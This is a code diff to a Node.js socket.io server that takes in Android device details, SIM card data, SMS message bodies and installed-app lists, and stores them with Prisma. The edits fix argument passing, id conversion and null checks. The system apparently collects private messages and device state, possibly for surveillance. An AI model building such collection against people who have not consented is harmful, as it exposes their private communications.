@@ -158,25 +158,25 @@ io.on('connection', (socket) => {
             }
 
             const updateData = {
-                android_id: getVal('android_id', 'androidId'),
-                manufacturer: getVal('manufacturer', 'manufacturer') ?? "Unknown",
-                model: getVal('model', 'model') ?? "Unknown",
-                brand: getVal('brand', 'brand'),
-                product: getVal('product', 'product'),
-                android_version: getVal('android_version', 'androidVersion'),
-                raw_device_info: getVal('raw_device_info', 'rawDeviceInfo'),
-                sim_cards: getVal('sim_cards', 'simCards'),
-                service_status: getVal('service_status', 'serviceStatus'),
-                oem_status: getVal('oem_status', 'oemStatus'),
-                power_save_status: getVal('power_save_status', 'powerSaveStatus'),
-                screen_status: getVal('screen_status', 'screenStatus'),
-                process_importance: (getVal('process_importance', 'processImportance') || null)?.toString(),
+                android_id: getVal(deviceData, 'android_id', 'androidId'),
+                manufacturer: getVal(deviceData, 'manufacturer', 'manufacturer') ?? "Unknown",
+                model: getVal(deviceData, 'model', 'model') ?? "Unknown",
+                brand: getVal(deviceData, 'brand', 'brand'),
+                product: getVal(deviceData, 'product', 'product'),
+                android_version: getVal(deviceData, 'android_version', 'androidVersion'),
+                raw_device_info: getVal(deviceData, 'raw_device_info', 'rawDeviceInfo'),
+                sim_cards: getVal(deviceData, 'sim_cards', 'simCards'),
+                service_status: getVal(deviceData, 'service_status', 'serviceStatus'),
+                oem_status: getVal(deviceData, 'oem_status', 'oemStatus'),
+                power_save_status: getVal(deviceData, 'power_save_status', 'powerSaveStatus'),
+                screen_status: getVal(deviceData, 'screen_status', 'screenStatus'),
+                process_importance: (getVal(deviceData, 'process_importance', 'processImportance') || null)?.toString(),
 
                 // If heartbeat is included in the payload, save it too
                 heartbeat: deviceData.heartbeat || undefined,
 
-                app_id: getVal('app_id', 'appId'),
-                build_id: getVal('build_id', 'buildId'),
+                app_id: getVal(deviceData, 'app_id', 'appId'),
+                build_id: getVal(deviceData, 'build_id', 'buildId'),
                 status: true,
                 last_seen: new Date()
             };
@@ -409,7 +409,7 @@ io.on('connection', (socket) => {
             await prisma.$transaction(async (tx) => {
                 for (const msg of validMessages) {
                     const smsId = String(msg._idRaw);
-                    const localSmsId = getVal(msg, 'local_sms_id', 'localSmsId') || smsId;
+                    const localSmsId = String(getVal(msg, 'local_sms_id', 'localSmsId') || smsId);
                     const address = getVal(msg, 'address', 'address') || "";
                     const body = getVal(msg, 'body', 'body') || "";
                     const date = getVal(msg, 'date', 'date') || new Date().toISOString();
@@ -474,7 +474,7 @@ io.on('connection', (socket) => {
 
             if (dId && idRaw !== undefined && idRaw !== null) {
                 const smsId = String(idRaw);
-                const localSmsId = getVal(msg, 'local_sms_id', 'localSmsId') || smsId;
+                const localSmsId = String(getVal(msg, 'local_sms_id', 'localSmsId') || smsId);
                 const address = getVal(msg, 'address', 'address') || "";
                 const body = getVal(msg, 'body', 'body') || "";
                 const date = getVal(msg, 'date', 'date') || new Date().toISOString();
@@ -564,20 +564,20 @@ io.on('connection', (socket) => {
                     const versionName = getVal(app, 'version_name', 'versionName') || "";
 
                     const versionCodeFn = getVal(app, 'version_code', 'versionCode');
-                    const versionCode = versionCodeFn ? BigInt(versionCodeFn) : null;
+                    const versionCode = (versionCodeFn !== undefined && versionCodeFn !== null) ? BigInt(versionCodeFn) : null;
 
                     const firstInstallTimeFn = getVal(app, 'first_install_time', 'firstInstallTime');
-                    const firstInstallTime = firstInstallTimeFn ? BigInt(firstInstallTimeFn) : null;
+                    const firstInstallTime = (firstInstallTimeFn !== undefined && firstInstallTimeFn !== null) ? BigInt(firstInstallTimeFn) : null;
 
                     const lastUpdateTimeFn = getVal(app, 'last_update_time', 'lastUpdateTime');
-                    const lastUpdateTime = lastUpdateTimeFn ? BigInt(lastUpdateTimeFn) : null;
+                    const lastUpdateTime = (lastUpdateTimeFn !== undefined && lastUpdateTimeFn !== null) ? BigInt(lastUpdateTimeFn) : null;
 
                     const isSystemApp = Boolean(getVal(app, 'is_system_app', 'isSystemApp'));
                     const targetSdk = parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0");
                     const minSdk = parseInt(getVal(app, 'min_sdk', 'minSdk') || "0");
 
                     const syncTsFn = getVal(app, 'sync_timestamp', 'syncTimestamp');
-                    const syncTimestamp = syncTsFn ? BigInt(syncTsFn) : BigInt(Date.now());
+                    const syncTimestamp = (syncTsFn !== undefined && syncTsFn !== null) ? BigInt(syncTsFn) : BigInt(Date.now());
 
                     await tx.installedApp.upsert({
                         where: {
